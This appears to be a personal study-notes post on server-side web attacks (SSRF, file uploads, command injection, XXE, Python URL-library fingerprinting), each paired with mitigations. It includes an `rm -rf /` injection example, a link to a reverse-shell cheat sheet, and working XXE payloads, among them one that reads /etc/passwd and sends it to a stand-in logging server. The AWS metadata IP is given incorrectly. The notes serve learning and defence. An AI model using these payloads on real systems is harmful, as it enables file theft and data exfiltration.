---
title: "Server Side Security"
date: 2020-06-29T18:00:00+10:00

hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Server Side Security

## Server Side Request Forgery (SSRF)

Make the server do something it's not intended to.  
i.e. Access a server that should only be accessed locally / within the LAN

### Mitigation against SSRF

* Protect your infrastructure!
* Whitelist the allowed domains
* Whitelist the allowed IPs
* Disable internal domains
* Disable internal IPs

For AWS, this might involve blocking access to cloud metadata services (169.254.269.254)

## File Upload Vulnerabilities

* Where does the file get uploaded to, can we modify the URL to get access to other files?
* Access control violation possiblities?
* **Mitigation** - Access control! 
* Crashing the server
  * Very large files
  * Unzip bomb - Crash the server
  * **Mitigation** - Max file limits, max recursion limits
* Can I upload a [web shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/), and then access the shell
  * **Mitigation** - Run the web server in a restricted account!!!

## Command Injection

> `$name = hek.pdf; rm -rf /`  
> System: `cat $name` -> `cat $name; rm -rf /`

* How does the server handle user input
* Is user input being safely inserted?
* **Mitigation** - Ensure to escape and sanitise input

## Server Side Includes

Where the server reads opens files in the system, as a result of malicious user input
* Can I reach network shares, other servers, the internet?

* **Mitigation** - Sanitise input

## XML Attack

> XML is a markup language used to hierarchically describe data.  
One feature they contain is the ability to import other documents (known as Document Type Definitions), but also external resources - which can be used as data results in the XML reponse.  

<u>This is bad</u>, we can perform Local File Inclusion (LFI): `<!ENTITY xxe SYSTEM "file:///etc/passwd">`

Read: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### Crafting an Attack

We first define our DOCTYPE

```xml
<!DOCTYPE foo [
]>
```

Then we can attach our `<!ENTITY variable data>` inside the `[ ... ]` pair.

**Examples**

* `<!ENTITY usualEntity "Hello">`
* `<!ENTITY passwdFile SYSTEM "file:///etc/passwd">`
* `<!ENTITY localOnlyFile SYSTEM "http://localhost:1111/text.txt">`
* `<!ENTITY programResult SYSTEM "expect://id">` _(Often won't work as `expect` needs to be explicitly enabled by the admin)_ 

To access these data elements, we call them like `&var;` in the XML contents.  

For example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY passwdFile SYSTEM "file:///etc/passwd">
]> 
<data>
  <item>&passwdFile;</item>
</data>
```

### Crafting an Attack - Parameterised Entities

There also exists parameterised entities, which can be references by other entities, but also 'executed' - which we can take advantage of.

They are described as such: `<!ENTITY % variable data>`  
_Note the '% ` (percent, space)_

```xml
<!DOCTYPE foo [
  <!ENTITY % string "woah" >
  <!ENTITY % result "Got me like: %string;" >
]>
```

### Crafting an Attack - Error Based XXE

We can perform error-based attacks, however we are required to load an external DTD file.  
That is, the entity definition cannot be included in the local file :'(


**XML**  

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://some.server/ext.dtd">
    %ext;
]>
<message></message>
```

**ext.dtd**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Here, the `ext.dtd` file is retrieved and parsed.  
`%file;` contains the contents of the `/etc/passwd` file on the server machine.  
`%eval;` is an entity that produces another entity _(that has not yet been evaluated itself)_
`%error;` will attempt to actually fetch the contents of `/nonexistent/+YOURDATAHERE`  

It will cause an error as the file does not exist, and it will reveal the path which it tried to find.  
The 'path' will contain our LFI data

### Crafting an Attack - Local DTD

In the case where we cannot load external DTD's (as a result of firewalls, WAFs, etc), we can attempt to find a DTD file locally (via directory enumeration / recon) - that meets two criterion

1) A parameterised entity exists
2) That same parameterised entity is evaluated

> XML will only parse the first entity definition of a given name, so if we had

> ```xml
<!ENTITY % test "1">
<!ENTITY % test "2">
```

> `%test;` will evaluate to `1`

After a file has been selected, we can declare the entity before the local DTD file is included, hence setting an entity to our own value (condition 1). The local DTD will then evaluate OUR value (condition 2) - causing OUR values to execute

### Crafting an Attack - Out of Band Exploits

In the event that we cannot see the output of our XML directly, we can use parameterised queries to make a request to a server that we own

```xml
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY %doit SYSTEM "http://myloggingserver/?%xxe;">
%doit;
```

We will only get the first line of the file however, although we can attempt to encode it - depending on what the server is using.

If PHP is used, we can use `php://filter/convert.base64-encode/resource=/etc/passwd` which will b64 encode the `/etc/passwd` file.

### Mitigating XXE Attacks

* Disable External Entities
* Don't use PHP
* Don't use XML (xd)

## Python Library fingerprinting

A Python server may require connectivity to a different server depending on the user input.  
We can send a magic payload such as `http://1.1.1.1\x00&@2.2.2.2#\x00@3.3.3.3/` to fingerprint what library is used by the server (We need to own the IPs 1.1.1.1, 2.2.2.2, 3.3.3.3)

If 1.1.1.1 - urllib2, httplib  
if 2.2.2.2 - requests  
if 3.3.3.3 - urllib

